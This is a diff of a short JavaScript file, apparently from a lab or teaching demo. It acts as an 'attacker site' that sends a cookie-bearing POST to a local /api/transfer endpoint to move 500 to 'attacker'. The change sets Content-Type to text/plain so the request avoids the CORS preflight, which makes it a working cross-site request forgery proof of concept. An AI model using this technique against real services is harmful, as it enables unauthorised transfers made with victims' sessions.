@@ -1,7 +1,5 @@
 console.log("This is the attacker site");
 
-//fetch("http://localhost:8000")
-
 fetch(
     "http://localhost:8000/api/transfer",
     {
@@ -11,16 +9,10 @@ fetch(
         // Must be set to "include" or "same-origin" to send OR receive cookies
         credentials: "include",
         headers: {
-            'Content-Type': 'application/json', // TODO: Change for exploit
-            //'Content-Type': 'text/plain',
-            //'Access-Control-Allow-Origin': '*',
-            'Origin': 'http://localhost:8000',
-            //'Host:': 'localhost:8000'
+            // Below is what is expected, but by changing it to text/plain CORS is ignored server-side.
+            //'Content-Type': 'application/json',
+            'Content-Type': 'text/plain',
         },
-        // body: {
-        //     to_user: "attacker",
-        //     amount: 500
-        // }
         body: JSON.stringify({
             to_user: "attacker",
             amount: 500
@@ -29,11 +21,5 @@ fetch(
 ).then(
     response => {
         console.log(response);
-        //return response.json()
     }
 )
-// ).then(
-//     data => {
-//         console.log(data);
-//     }
-// )
